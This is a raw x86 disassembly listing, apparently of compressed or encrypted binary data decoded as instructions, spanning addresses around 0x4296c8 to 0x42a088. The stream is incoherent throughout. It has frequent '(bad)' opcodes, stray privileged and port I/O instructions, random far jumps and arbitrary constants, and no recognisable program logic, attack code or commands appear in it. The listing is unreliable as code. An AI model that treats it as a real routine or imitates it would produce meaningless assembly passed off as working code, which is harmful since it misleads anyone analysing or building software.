  4296c8:	les    edx,FWORD PTR [edi]
  4296ca:	push   ss
  4296cb:	iret   
  4296cc:	shl    BYTE PTR [ebx],1
  4296ce:	shl    BYTE PTR [eax-0x44],cl
  4296d1:	push   ecx
  4296d2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4296d3:	sbb    dl,bl
  4296d5:	cmp    ebp,DWORD PTR [ecx+0x1c]
  4296d8:	fcom   QWORD PTR [ecx]
  4296da:	les    eax,FWORD PTR [edi+0x3d]
  4296dd:	aas    
  4296de:	aad    0xb1
  4296e0:	sbb    esi,DWORD PTR [edx+0x32]
  4296e3:	and    bh,BYTE PTR [eax-0x4d]
  4296e6:	dec    edi
  4296e7:	adc    bl,BYTE PTR [esi]
  4296e9:	pop    esp
  4296ea:	xchg   ebp,esp
  4296ec:	pop    esp
  4296ed:	es dec esp
  4296ef:	cmp    dh,BYTE PTR [ebx+edx*1-0x4569d1d5]
  4296f6:	pusha  
  4296f7:	les    esp,FWORD PTR [edx+0x63]
  4296fa:	push   eax
  4296fb:	xor    ebp,DWORD PTR [edi-0x5229eb34]
  429701:	(bad)  
  429702:	mov    bh,0xb0
  429704:	add    BYTE PTR [edi],0x1f
  429707:	cdq    
  429708:	or     DWORD PTR [ebx-0x1dc9ee03],0xffffff89
  42970f:	div    DWORD PTR [edx]
  429711:	imul   ebp,esp,0x7bd8b74a
  429717:	test   al,0x90
  429719:	inc    ebx
  42971a:	lock push edi
  42971c:	mov    dl,0x22
  42971e:	mov    esi,0xcb30d6af
  429723:	mov    ebx,0x924cd4d3
  429728:	scas   eax,DWORD PTR es:[edi]
  429729:	cwde   
  42972a:	(bad)  
  42972b:	pop    ebp
  42972c:	xchg   ecx,eax
  42972d:	sbb    eax,0x82a05469
  429732:	mov    al,ds:0x192be176
  429737:	(bad)  
  429738:	mov    dh,0x5f
  42973a:	mov    bl,BYTE PTR [edx]
  42973c:	add    al,0x71
  42973e:	pop    ds
  42973f:	dec    eax
  429740:	push   cs
  429741:	aaa    
  429742:	fwait
  429743:	push   ds
  429744:	shr    DWORD PTR [ebp+esi*8+0x34],0x63
  429749:	movaps xmm3,xmm3
  42974c:	rol    dl,1
  42974e:	add    al,0x5f
  429750:	cwde   
  429751:	js     0x4296f7
  429753:	mov    al,0xbf
  429755:	pushf  
  429756:	lahf   
  429757:	out    0xa8,eax
  429759:	xchg   esp,eax
  42975a:	mov    al,0x68
  42975c:	mov    bh,BYTE PTR [eax+ebx*4+0x63]
  429760:	sub    DWORD PTR [ecx+0x54],eax
  429763:	outs   dx,DWORD PTR ds:[esi]
  429764:	dec    eax
  429765:	out    dx,eax
  429766:	imul   ebp,DWORD PTR [esi+0x3b312306],0x7f
  42976d:	in     eax,0xe5
  42976f:	xor    BYTE PTR [eiz*2-0x21b6a47a],dl
  429776:	stos   DWORD PTR es:[edi],eax
  429777:	test   BYTE PTR [eax-0x63e0d9e1],0x10
  42977e:	add    BYTE PTR [esp+edi*1-0x1eccf9ad],0xc5
  429786:	lods   al,BYTE PTR ds:[esi]
  429787:	rol    ebx,cl
  429789:	sbb    ebx,DWORD PTR [ebx+0x19a7696b]
  42978f:	xor    eax,0x5f
	...
  4297f4:	xor    BYTE PTR [edx-0x21],al
  4297f7:	(bad)  
  4297f8:	(bad)  
  4297f9:	(bad)  
  4297fa:	mov    ebp,0x1d164c52
  4297ff:	pop    ebp
  429800:	xor    ebx,eax
  429802:	adc    DWORD PTR [ebx],ebx
  429804:	pop    edx
  429805:	mov    esp,0x1050001
  42980a:	add    BYTE PTR [eax],al
  42980c:	(bad)  
  42980d:	gs mov ah,0xaf
  429810:	adc    al,0xbc
  429812:	mov    esi,0x46568ee5
  429817:	inc    ebp
  429818:	mov    BYTE PTR [ebx],bh
  42981a:	jge    0x4297a9
  42981c:	jbe    0x42983c
  42981e:	xchg   BYTE PTR ds:0x2d1e6b32,al
  429824:	mov    ebx,0x778575e9
  429829:	repz imul esp,DWORD PTR [ebx-0x60b5b5f6],0x85a2c318
  429834:	hlt    
  429835:	or     edx,DWORD PTR [edi+0x4f]
  429838:	pop    edi
  429839:	ja     0x42984d
  42983b:	xchg   ecx,eax
  42983c:	jmp    0x4297f3
  42983e:	xchg   bl,dh
  429840:	outs   dx,BYTE PTR ds:[esi]
  429841:	lock mov cl,0x6b
  429844:	or     ebp,eax
  429846:	xor    ebp,esp
  429848:	cwde   
  429849:	scas   eax,DWORD PTR es:[edi]
  42984a:	sbb    DWORD PTR [eax+eiz*4-0x520bf45e],0x7b
  429852:	xor    bh,dl
  429854:	fwait
  429855:	mov    dh,0x18
  429857:	mov    ebp,0x9dce567c
  42985c:	shl    DWORD PTR [edx+0x74],cl
  42985f:	pop    eax
  429860:	inc    eax
  429861:	pop    ss
  429862:	cmc    
  429863:	adc    BYTE PTR [eax],ah
  429865:	sbb    dh,bh
  429867:	shl    DWORD PTR [esi],1
  429869:	dec    esp
  42986a:	add    cl,BYTE PTR ds:0x129dbfa7
  429870:	fbld   TBYTE PTR [eax+ebx*8+0x1b]
  429874:	daa    
  429875:	push   edx
  429876:	in     al,0x77
  429878:	std    
  429879:	arpl   WORD PTR [edi-0x3aa2dd3e],ax
  42987f:	or     DWORD PTR [eax+0xacbe66f],esp
  429885:	cmp    DWORD PTR [ecx+ebx*4+0x5ca1a80f],edx
  42988c:	(bad)  
  42988d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42988e:	jg     0x4298e3
  429890:	sub    edi,DWORD PTR [esi]
  429892:	lods   eax,DWORD PTR ds:[esi]
  429893:	daa    
  429894:	jbe    0x429847
  429896:	adc    al,0x20
  429898:	xchg   esp,eax
  429899:	push   edx
  42989a:	inc    BYTE PTR [edx-0x10c0557b]
  4298a0:	pop    esi
  4298a1:	dec    ecx
  4298a2:	or     eax,0x5b412e9f
  4298a7:	xchg   esi,eax
  4298a8:	push   ss
  4298a9:	js     0x429892
  4298ab:	retf   0x6255
  4298ae:	push   eax
  4298af:	mov    es,WORD PTR [edx]
  4298b1:	loop   0x42989d
  4298b3:	ja     0x429886
  4298b5:	pop    ebx
  4298b6:	mov    DWORD PTR [ecx-0x19],ebx
  4298b9:	push   ecx
  4298ba:	pushf  
  4298bb:	dec    esp
  4298bc:	jle    0x4298f0
  4298be:	fst    QWORD PTR [edi]
  4298c0:	fimul  WORD PTR [edi-0x6780629b]
  4298c6:	icebp  
  4298c7:	adc    DWORD PTR [ebx-0x13],esi
  4298ca:	xor    ecx,DWORD PTR [edx]
  4298cc:	mov    cl,0xdc
  4298ce:	lahf   
  4298cf:	lds    edx,FWORD PTR gs:[eax+0x41]
  4298d3:	xlat   BYTE PTR ds:[ebx]
  4298d4:	xlat   BYTE PTR ds:[ebx]
  4298d5:	mov    edi,0x8207dad
  4298da:	out    dx,al
  4298db:	push   0x312cf35b
  4298e0:	jae    0x4298ec
  4298e2:	cmp    al,0xac
  4298e4:	and    esi,DWORD PTR [edx+0x67725d4e]
  4298ea:	shr    eax,cl
  4298ec:	sti    
  4298ed:	ins    DWORD PTR es:[edi],dx
  4298ee:	lea    ebx,[esi]
  4298f0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4298f1:	jo     0x42989f
  4298f3:	fdivrp st(5),st
  4298f5:	adc    ch,dh
  4298f7:	inc    edx
  4298f8:	adc    edx,edx
  4298fa:	dec    esi
  4298fb:	add    bh,ch
  4298fd:	inc    ebp
  4298fe:	inc    eax
  4298ff:	ins    DWORD PTR es:[edi],dx
  429900:	xchg   ebx,eax
  429901:	or     eax,0x164a7dd3
  429906:	in     eax,dx
  429907:	inc    ebx
  429908:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  429909:	and    eax,ecx
  42990b:	outs   dx,BYTE PTR ds:[esi]
  42990c:	fistp  DWORD PTR [eax+ecx*4+0xd39a]
	...
  429973:	add    BYTE PTR [edi+0x68],dl
  429976:	fistp  QWORD PTR fs:[edi-0x21]
  42997a:	(bad)  
  42997b:	call   0x3b7e6d73
  429980:	and    bl,BYTE PTR [edi]
  429982:	jp     0x42992f
  429984:	pop    edi
  429985:	mov    ebp,0x1050001
  42998a:	add    BYTE PTR [eax],al
  42998c:	inc    edi
  42998d:	cmp    eax,DWORD PTR [esi]
  42998f:	ins    BYTE PTR es:[edi],dx
  429990:	sub    eax,0x4a8b89d
  429995:	adc    DWORD PTR [edi],edi
  429997:	xor    DWORD PTR [esi+eiz*8],ebp
  42999a:	mov    gs,WORD PTR [edi-0xbdb334e]
  4299a0:	or     al,0xf6
  4299a2:	dec    DWORD PTR [ecx+0x3e]
  4299a5:	imul   esi,DWORD PTR ds:0xdd55b075,0x791ce203
  4299af:	jnp    0x429994
  4299b1:	rcl    DWORD PTR [esi-0x3a],0x2d
  4299b5:	scas   al,BYTE PTR es:[edi]
  4299b6:	dec    edi
  4299b7:	or     al,BYTE PTR [esi-0x31]
  4299ba:	dec    esp
  4299bb:	jno    0x429a28
  4299bd:	and    esp,DWORD PTR [eax]
  4299bf:	mov    bh,0x8f
  4299c1:	cwde   
  4299c2:	mov    ebx,0x2c3e744e
  4299c7:	(bad)  
  4299c8:	cmp    BYTE PTR [esi+ebx*8],dh
  4299cb:	iret   
  4299cc:	(bad)  
  4299cd:	xchg   bh,ch
  4299cf:	xchg   ebx,eax
  4299d0:	add    al,0xee
  4299d2:	xor    al,0xc2
  4299d4:	js     0x429a53
  4299d6:	ja     0x429a0d
  4299d8:	imul   esi,DWORD PTR [eax],0x536ce896
  4299de:	xlat   BYTE PTR ds:[ebx]
  4299df:	fld    DWORD PTR [edi+0x7f]
  4299e2:	adc    DWORD PTR [ebp-0x15fea1f8],0x6
  4299e9:	pop    ds
  4299ea:	lea    eax,[edx]
  4299ec:	stos   DWORD PTR es:[edi],eax
  4299ed:	es dec ebx
  4299ef:	fsub   DWORD PTR [ecx+0x4cc971ea]
  4299f5:	les    eax,FWORD PTR [ebx]
  4299f7:	lods   al,BYTE PTR ds:[esi]
  4299f8:	pop    ecx
  4299f9:	push   esi
  4299fa:	pop    ecx
  4299fb:	rol    DWORD PTR [ebx],cl
  4299fd:	push   es
  4299fe:	dec    ecx
  4299ff:	es loop 0x429a2c
  429a02:	push   esp
  429a03:	aad    0x50
  429a05:	in     al,dx
  429a06:	mov    DWORD PTR [ecx+0xc],ebp
  429a09:	or     BYTE PTR [eax-0x6990526b],bh
  429a0f:	pushf  
  429a10:	call   0xffaa:0x3b88bc1b
  429a17:	mov    dh,0x48
  429a19:	mov    ebp,0xf033f37c
  429a1e:	(bad)  
  429a1f:	ficomp DWORD PTR [esi-0x78]
  429a22:	xlat   BYTE PTR ds:[ebx]
  429a23:	(bad)  
  429a24:	push   ss
  429a25:	jmp    0x3b11:0x9bfda8f9
  429a2c:	push   esi
  429a2d:	sbb    ch,ch
  429a2f:	icebp  
  429a30:	sub    eax,0x9aea7d69
  429a35:	jmp    0x429a14
  429a37:	jmp    0xbd3d1af8
  429a3c:	inc    esi
  429a3d:	mov    edi,DWORD PTR [ebx+edx*4-0x8]
  429a41:	jge    0x4299c4
  429a43:	int    0xd
  429a45:	sbb    BYTE PTR ss:[edx-0x6ca15769],dh
  429a4c:	pop    esi
  429a4d:	lahf   
  429a4e:	mov    bl,0x9a
  429a50:	xor    eax,0x911c7ed1
  429a55:	adc    cl,BYTE PTR [edx+0x1a15ea22]
  429a5b:	repz mov ds:0xba63676f,eax
  429a61:	sti    
  429a62:	mov    esp,0x1f342699
  429a67:	push   ds
  429a68:	imul   ebp,DWORD PTR [esi],0xc926a586
  429a6e:	jb     0x429a89
  429a70:	pop    es
  429a71:	xchg   edx,eax
  429a72:	mov    eax,ds:0x70aada84
  429a77:	scas   al,BYTE PTR es:[edi]
  429a78:	mov    ecx,0x5e84fcad
  429a7d:	ror    DWORD PTR [edx+0x1a],1
  429a80:	add    esi,DWORD PTR [ecx]
  429a82:	icebp  
  429a83:	and    ebp,esp
  429a85:	mov    ebp,0x582ea376
  429a8a:	xor    al,cl
  429a8c:	dec    edx
  429a8d:	xor    al,0x83
  429a8f:	cmp    DWORD PTR [ecx+0x0],ecx
	...
  429af2:	add    BYTE PTR [eax],al
  429af4:	into   
  429af5:	std    
  429af6:	sti    
  429af7:	leave  
  429af8:	sti    
  429af9:	iret   
  429afa:	(bad)  
  429afb:	jmp    DWORD PTR ds:0xffa95667
  429b01:	int3   
  429b02:	dec    edx
  429b03:	pop    es
  429b04:	fs mov esi,0x1050001
  429b0a:	add    BYTE PTR [eax],al
  429b0c:	xchg   ebx,eax
  429b0d:	inc    ebx
  429b0e:	or     al,0x44
  429b10:	inc    ebx
  429b11:	imul   edx,esp,0xffffff90
  429b14:	push   eax
  429b15:	test   al,0xfd
  429b17:	mov    cs,WORD PTR [eax]
  429b19:	push   ecx
  429b1a:	cmc    
  429b1b:	aad    0xe5
  429b1d:	popf   
  429b1e:	es and al,0x1f
  429b21:	push   ecx
  429b22:	fsubr  st(1),st
  429b24:	fs mov edx,0xeed756de
  429b2a:	test   al,0x71
  429b2c:	lea    esp,[edi-0x1eb8ac1b]
  429b32:	sbb    DWORD PTR [ebx-0x4e],ecx
  429b35:	xchg   DWORD PTR [edi-0x1],ebx
  429b38:	scas   al,BYTE PTR es:[edi]
  429b39:	das    
  429b3a:	fcomp  DWORD PTR [ebx+0x78741a93]
  429b40:	adc    ah,bh
  429b42:	stos   BYTE PTR es:[edi],al
  429b43:	adc    DWORD PTR [eax],edx
  429b45:	and    eax,0xb7d1fc8f
  429b4a:	sub    DWORD PTR [eax+0x25f8716e],ecx
  429b50:	adc    al,0x6c
  429b52:	cmp    eax,0x35233798
  429b57:	or     DWORD PTR [esi+0x15],ebx
  429b5a:	push   edi
  429b5b:	lods   al,BYTE PTR ds:[esi]
  429b5c:	dec    edi
  429b5d:	cmp    bh,BYTE PTR ds:0xe86da6a8
  429b63:	sbb    cl,cl
  429b65:	repnz fsub QWORD PTR [esi]
  429b68:	stc    
  429b69:	inc    eax
  429b6a:	shr    bl,cl
  429b6c:	inc    ebp
  429b6d:	(bad)  
  429b6e:	repnz mov bl,0xb2
  429b71:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  429b72:	mov    cl,0x79
  429b74:	xchg   ebx,eax
  429b75:	jnp    0x429b28
  429b77:	test   eax,0xb69aca52
  429b7c:	aam    0xbd
  429b7e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  429b7f:	xchg   edi,eax
  429b80:	aaa    
  429b81:	or     BYTE PTR [esi+0x13451279],bh
  429b87:	push   0xe0637ac6
  429b8c:	mov    ecx,0xdfd55ab0
  429b91:	rol    DWORD PTR [eax-0x70],cl
  429b94:	sahf   
  429b95:	in     eax,dx
  429b96:	push   esi
  429b97:	stos   DWORD PTR es:[edi],eax
  429b98:	push   esp
  429b99:	sub    BYTE PTR [edx+0x44],cl
  429b9c:	stos   DWORD PTR es:[edi],eax
  429b9d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  429b9e:	inc    ebx
  429b9f:	inc    eax
  429ba0:	xor    al,BYTE PTR [ebx+0x127b7ea8]
  429ba6:	test   al,0x5c
  429ba8:	sbb    BYTE PTR [edx-0x77],ah
  429bab:	mov    BYTE PTR [eax+0x5c],al
  429bae:	pop    ebp
  429baf:	cmc    
  429bb0:	loop   0x429bcf
  429bb2:	or     eax,0x20e74b59
  429bb7:	test   DWORD PTR [eax+0x277f027e],0x913168d3
  429bc1:	and    dh,0x1b
  429bc4:	xchg   ebp,eax
  429bc5:	shr    dl,1
  429bc7:	out    0xae,al
  429bc9:	or     DWORD PTR [edi+0x50],ebp
  429bcc:	std    
  429bcd:	and    DWORD PTR [ebx+0x3ef0c30e],esi
  429bd3:	fmul   QWORD PTR [esi]
  429bd5:	jns    0x429baf
  429bd7:	xchg   esi,eax
  429bd8:	push   ebx
  429bd9:	and    al,0x94
  429bdb:	mov    DWORD PTR [eax],esp
  429bdd:	into   
  429bde:	mov    esp,0x2e77c7f4
  429be3:	daa    
  429be4:	push   ds
  429be5:	rcr    DWORD PTR [eax],1
  429be7:	ins    BYTE PTR es:[edi],dx
  429be8:	cmp    al,0x57
  429bea:	imul   edx,DWORD PTR [ecx],0x35628131
  429bf0:	popa   
  429bf1:	jbe    0x429c44
  429bf3:	cmp    esi,edi
  429bf5:	mov    ds:0x8a37b87d,al
  429bfa:	add    eax,0xe934fcb9
  429bff:	or     DWORD PTR [edx+0x68],esi
  429c02:	sub    eax,0x5dc5e929
  429c07:	sub    al,0xf9
  429c09:	cmc    
  429c0a:	mov    BYTE PTR ds:0xfa254c91,bl
  429c10:	sub    al,0x0
	...
  429c72:	add    BYTE PTR [eax],al
  429c74:	mov    ds:0xb788a616,eax
  429c79:	mov    eax,0x89413faf
  429c7e:	(bad)  
  429c7f:	xor    BYTE PTR [eax+0x6943ea13],dl
  429c85:	mov    edi,0x1050001
  429c8a:	add    BYTE PTR [eax],al
  429c8c:	ins    DWORD PTR es:[edi],dx
  429c8d:	xor    DWORD PTR [edi-0xec2fbac],ebp
  429c93:	push   ecx
  429c94:	or     ch,BYTE PTR [ecx*1-0x3c1b3877]
  429c9b:	out    dx,al
  429c9c:	pop    ss
  429c9d:	stos   BYTE PTR es:[edi],al
  429c9e:	sbb    BYTE PTR [esi],dh
  429ca0:	mov    ch,0xc9
  429ca2:	add    eax,0x96cf556a
  429ca7:	ss imul ebp,edx,0xcda4a01e
  429cae:	jecxz  0x429c77
  429cb0:	mov    edi,0xcfad48b
  429cb5:	sbb    ecx,DWORD PTR [ecx+0x6ef5e221]
  429cbb:	sbb    dl,BYTE PTR [eax-0x3ac1f163]
  429cc1:	test   al,0x50
  429cc3:	lock add edi,DWORD PTR ds:0x84c7c0d6
  429cca:	fcomp  QWORD PTR [ebx]
  429ccc:	and    eax,ebx
  429cce:	arpl   WORD PTR ss:[edx-0x23],bp
  429cd2:	mov    ah,0x2c
  429cd4:	pushf  
  429cd5:	dec    edx
  429cd6:	fwait
  429cd7:	add    al,0x5d
  429cd9:	xor    edx,0xa1b3675e
  429cdf:	lods   eax,DWORD PTR ds:[esi]
  429ce0:	cmp    bh,dl
  429ce2:	xor    ch,cl
  429ce4:	repnz pusha 
  429ce6:	sbb    ebp,DWORD PTR [ecx]
  429ce8:	pop    esi
  429ce9:	pop    es
  429cea:	xchg   esp,eax
  429ceb:	(bad)
  429cee:	xchg   ebp,eax
  429cef:	retf   
  429cf0:	or     edx,DWORD PTR [edi-0x2e]
  429cf3:	or     DWORD PTR [ebx+ebx*8+0x44],esi
  429cf7:	in     al,dx
  429cf8:	xchg   esi,eax
  429cf9:	in     al,dx
  429cfa:	add    ch,dl
  429cfc:	stc    
  429cfd:	xor    esi,ebx
  429cff:	sbb    bl,dh
  429d01:	jmp    0x429d0b
  429d03:	out    dx,eax
  429d04:	pop    ecx
  429d05:	mov    ds:0xf035714a,al
  429d0a:	dec    edx
  429d0b:	xchg   BYTE PTR [ecx+eax*4+0x40d184ec],dh
  429d12:	lds    edi,FWORD PTR [edx-0x56479712]
  429d18:	fistp  QWORD PTR [eax+0x1f]
  429d1b:	add    esi,esi
  429d1d:	fwait
  429d1e:	sbb    dh,BYTE PTR [esi+0x6b]
  429d21:	mov    eax,0x982f0427
  429d26:	inc    edi
  429d27:	(bad)  
  429d28:	pop    esp
  429d29:	(bad)  
  429d2a:	(bad)  
  429d2c:	push   es
  429d2d:	inc    ecx
  429d2e:	dec    ebp
  429d2f:	imul   ecx,ebp,0xffffffe1
  429d32:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  429d33:	pop    eax
  429d34:	mov    ds,WORD PTR fs:[ebx]
  429d37:	push   0x26
  429d39:	das    
  429d3a:	xor    cl,bh
  429d3c:	inc    edi
  429d3d:	jbe    0x429d9c
  429d3f:	mov    bh,0x2d
  429d41:	into   
  429d42:	in     al,dx
  429d43:	clc    
  429d44:	add    al,0x8f
  429d46:	in     al,0x6a
  429d48:	mov    ebp,0x446e115f
  429d4d:	test   BYTE PTR [ecx-0xf],ch
  429d50:	shr    DWORD PTR [eax-0x56],1
  429d53:	dec    esi
  429d54:	xchg   esi,eax
  429d55:	sar    BYTE PTR [ecx-0x2f],0x0
  429d59:	xor    BYTE PTR [edx+0x32],cl
  429d5c:	sbb    esp,ebp
  429d5e:	mov    edx,0x1cce540c
  429d63:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  429d64:	shl    DWORD PTR [eax],0x13
  429d67:	stc    
  429d68:	popa   
  429d69:	fcom   DWORD PTR ds:0xec6b5fac
  429d6f:	xchg   esp,eax
  429d70:	or     ebx,0x60d35270
  429d76:	dec    eax
  429d77:	pop    edx
  429d78:	cdq    
  429d79:	adc    eax,0x6049be78
  429d7e:	sbb    DWORD PTR [eax+0x62f1aa5b],edx
  429d84:	(bad)  
  429d85:	xchg   edx,eax
  429d86:	adc    edx,DWORD PTR ds:0xc2d95c18
  429d8c:	sbb    bl,dl
  429d8e:	daa    
  429d8f:	mov    eax,ds:0x3
	...
  429df4:	fwait
  429df5:	mov    bh,0xc4
  429df7:	or     al,0xec
  429df9:	jg     0x429dd6
  429dfb:	mov    bh,0xe1
  429dfd:	sahf   
  429dfe:	loop   0x429e68
  429e00:	and    al,0x86
  429e02:	push   0x1c06e19
  429e07:	add    BYTE PTR ds:0x2f000001,al
  429e0d:	xchg   DWORD PTR [edx],eax
  429e0f:	xor    ah,dh
  429e11:	sub    DWORD PTR [esi-0x1e69ddc5],eax
  429e17:	push   edi
  429e18:	outs   dx,BYTE PTR ds:[esi]
  429e19:	scas   eax,DWORD PTR es:[edi]
  429e1a:	test   BYTE PTR [edx-0x6],dl
  429e1d:	icebp  
  429e1e:	dec    edx
  429e1f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  429e20:	cdq    
  429e21:	sub    eax,0xdc053f19
  429e26:	xchg   esi,eax
  429e27:	call   0xd4202d30
  429e2c:	jno    0x429e34
  429e2e:	fs ret 0x74f9
  429e32:	lds    eax,FWORD PTR [ebp+0x5b03a453]
  429e38:	sub    bh,BYTE PTR [edi+0x5b]
  429e3b:	ret    0xc3ee
  429e3e:	pextrw ecx,(bad),0xc5
  429e40:	dec    ebp
  429e41:	or     BYTE PTR [esi],dl
  429e43:	(bad)
  429e47:	xlat   BYTE PTR ds:[ebx]
  429e48:	stc    
  429e49:	out    0xd0,eax
  429e4b:	shr    BYTE PTR [esi],0xf9
  429e4e:	xchg   DWORD PTR [ecx+edi*2+0x59],ecx
  429e52:	xchg   ebx,eax
  429e53:	push   esi
  429e54:	aas    
  429e55:	repnz sub eax,0x9b795bc8
  429e5b:	nop
  429e5c:	inc    ebx
  429e5d:	in     al,dx
  429e5e:	(bad)  
  429e5f:	jg     0x429e98
  429e61:	aas    
  429e62:	sbb    BYTE PTR [edi+0x61],dl
  429e65:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  429e66:	stc    
  429e67:	xor    eax,0x2f3851cf
  429e6c:	mov    cl,0x7e
  429e6e:	mov    ch,0xe6
  429e70:	push   ds
  429e71:	sub    bh,BYTE PTR [ebp+0x76323f76]
  429e77:	jg     0x429eec
  429e79:	call   0xff44:0x7dd2366d
  429e80:	(bad)  
  429e81:	mov    ebx,DWORD PTR [edi-0x30]
  429e84:	and    al,0x7c
  429e86:	adc    eax,DWORD PTR [edx]
  429e88:	jno    0x429ef6
  429e8a:	pop    edi
  429e8b:	adc    cl,BYTE PTR [ecx]
  429e8d:	sub    eax,0xcc97e951
  429e92:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  429e93:	pop    ss
  429e94:	mov    eax,0x25c2f40
  429e99:	push   cs
  429e9a:	sbb    DWORD PTR [ebx-0x61],esp
  429e9d:	jmp    0xc75d:0x279747ad
  429ea4:	cs push ds
  429ea6:	pusha  
  429ea7:	xor    dh,dl
  429ea9:	aaa    
  429eaa:	aam    0x57
  429eac:	cld    
  429ead:	xchg   edi,eax
  429eae:	scas   eax,DWORD PTR es:[edi]
  429eaf:	jge    0x429eae
  429eb1:	mov    esi,0xb6a70ef8
  429eb6:	sbb    ebx,DWORD PTR [edi-0x3dec3fa0]
  429ebc:	call   FWORD PTR [edx+eax*2-0x25]
  429ec0:	dec    edi
  429ec1:	(bad)  
  429ec2:	int    0xe1
  429ec4:	in     eax,0xe8
  429ec6:	push   ebp
  429ec7:	in     al,dx
  429ec8:	(bad)  [esi]
  429eca:	mov    al,ds:0x29423f18
  429ecf:	sub    BYTE PTR [ecx],0xfe
  429ed2:	cdq    
  429ed3:	ins    BYTE PTR es:[edi],dx
  429ed4:	ss and al,0x19
  429ed7:	sub    eax,0xa89fc394
  429edc:	out    dx,eax
  429edd:	ds popa 
  429edf:	lods   al,BYTE PTR ds:[esi]
  429ee0:	fcomp  DWORD PTR [edi]
  429ee2:	xchg   ebp,eax
  429ee3:	sub    al,0x2c
  429ee5:	xor    ebx,DWORD PTR [ebx-0x5db3f7d5]
  429eeb:	in     al,0x22
  429eed:	push   ss
  429eee:	into   
  429eef:	sub    DWORD PTR [edx],ecx
  429ef1:	mov    esi,0x52ea653
  429ef6:	idiv   esi
  429ef8:	rcl    DWORD PTR [esi+0x661d4366],0x85
  429eff:	ds push ebp
  429f01:	int    0x5a
  429f03:	cli    
  429f04:	icebp  
  429f05:	push   edi
  429f06:	mov    esi,0x4213cf22
  429f0b:	jle    0x429f6d
  429f0d:	les    ebp,FWORD PTR gs:[eax]
  429f10:	push   0x0
	...
  429f72:	add    BYTE PTR [eax],al
  429f74:	xor    DWORD PTR [ebp-0x38],eax
  429f77:	push   es
  429f78:	cld    
  429f79:	(bad)  
  429f7a:	push   DWORD PTR [edi-0x50]
  429f7d:	cld    
  429f7e:	sbb    esp,DWORD PTR [ebx+0x423a0aea]
  429f84:	jae    0x429f47
  429f86:	add    DWORD PTR [eax],eax
  429f88:	add    eax,0x6d000001
  429f8d:	call   0x4844:0x78d63c9
  429f94:	dec    edx
  429f95:	pushf  
  429f96:	or     BYTE PTR [ebp+0x23ee2979],bl
  429f9c:	or     BYTE PTR [ebx+0x2d],0xbd
  429fa0:	add    esi,edi
  429fa2:	dec    ecx
  429fa3:	sbb    edi,DWORD PTR [edi+esi*8-0x1ae3ea25]
  429faa:	fild   DWORD PTR [ebp-0x44]
  429fad:	imul   ecx,DWORD PTR [ebp+0xa1b01a0],0x8bb91993
  429fb7:	ins    BYTE PTR es:[edi],dx
  429fb8:	std    
  429fb9:	mov    ds:0x53a7101a,al
  429fbe:	pop    ebx
  429fbf:	into   
  429fc0:	mov    bh,0xf8
  429fc2:	rcl    DWORD PTR [esi],1
  429fc4:	sub    al,0x8c
  429fc6:	and    BYTE PTR [esi],dl
  429fc8:	bound  edx,QWORD PTR [ecx]
  429fca:	stc    
  429fcb:	mov    ds:0xc7e2fbb4,al
  429fd0:	(bad)  
  429fd1:	lahf   
  429fd2:	popa   
  429fd3:	xlat   BYTE PTR ds:[ebx]
  429fd4:	aas    
  429fd5:	les    edi,FWORD PTR [esi]
  429fd7:	hlt    
  429fd8:	or     eax,0x3ea33589
  429fdd:	(bad)  
  429fde:	ds aas 
  429fe0:	sahf   
  429fe1:	cli    
  429fe2:	repz fwait
  429fe4:	inc    esi
  429fe5:	or     BYTE PTR [esi+ebx*8],0xdd
  429fe9:	push   ss
  429fea:	scas   eax,DWORD PTR es:[edi]
  429feb:	push   es
  429fec:	adc    al,0xbf
  429fee:	stos   BYTE PTR es:[edi],al
  429fef:	test   al,0x64
  429ff1:	xchg   ebx,eax
  429ff2:	(bad)  
  429ff3:	adc    al,bh
  429ff5:	or     al,0x31
  429ff7:	repz jmp 0x957e4631
  429ffd:	jmp    0xe0cf160
  42a002:	mov    ds:0xfead6f03,al
  42a007:	fmul   DWORD PTR [esi]
  42a00a:	add    ebx,DWORD PTR [edx+0x44]
  42a00d:	pop    ds
  42a00e:	fcmove st,st(4)
  42a010:	and    esp,DWORD PTR [ecx-0x8073fa]
  42a016:	rol    BYTE PTR [ecx],0xe1
  42a019:	hlt    
  42a01a:	push   esp
  42a01b:	mov    esp,0x1b87fead
  42a020:	mov    ah,0x6b
  42a022:	fcomp  QWORD PTR [ecx-0x3]
  42a025:	hlt    
  42a026:	inc    edi
  42a027:	mov    bh,0x5
  42a029:	dec    esi
  42a02a:	pop    ss
  42a02b:	inc    edx
  42a02c:	mov    edi,0x652e71ac
  42a031:	sub    al,bl
  42a033:	inc    edx
  42a034:	xor    eax,0xf9a24d40
  42a039:	mov    bl,0xe5
  42a03b:	or     BYTE PTR es:[edx],0xf9
  42a03f:	xchg   dl,ah
  42a041:	xchg   DWORD PTR [ecx],esi
  42a043:	inc    eax
  42a044:	pop    esi
  42a045:	add    DWORD PTR [ecx],ebp
  42a047:	mov    ecx,0x8d34f7c9
  42a04c:	int3   
  42a04d:	enter  0xb20d,0xb2
  42a051:	(bad)  
  42a052:	ficomp WORD PTR [ecx+0x72b5d2eb]
  42a058:	iret   
  42a059:	sub    bh,cl
  42a05b:	mov    al,ds:0x391e1f8d
  42a060:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42a061:	sti    
  42a062:	clc    
  42a063:	and    al,0x41
  42a065:	and    eax,0x41b5e262
  42a06a:	add    al,0xc8
  42a06c:	sbb    bh,dl
  42a06e:	rcr    DWORD PTR [esi-0x27b8dad2],1
  42a074:	(bad)  
  42a075:	shl    DWORD PTR [ebp-0x42],1
  42a078:	jns    0x42a065
  42a07a:	push   edx
  42a07b:	lods   eax,DWORD PTR ds:[esi]
  42a07c:	loope  0x42a08e
  42a07e:	cmp    DWORD PTR [ebx+edx*1],0xf
  42a082:	lahf   
  42a083:	sub    eax,0xd7c508be
  42a088:	and    esi,DWORD PTR [ebx]
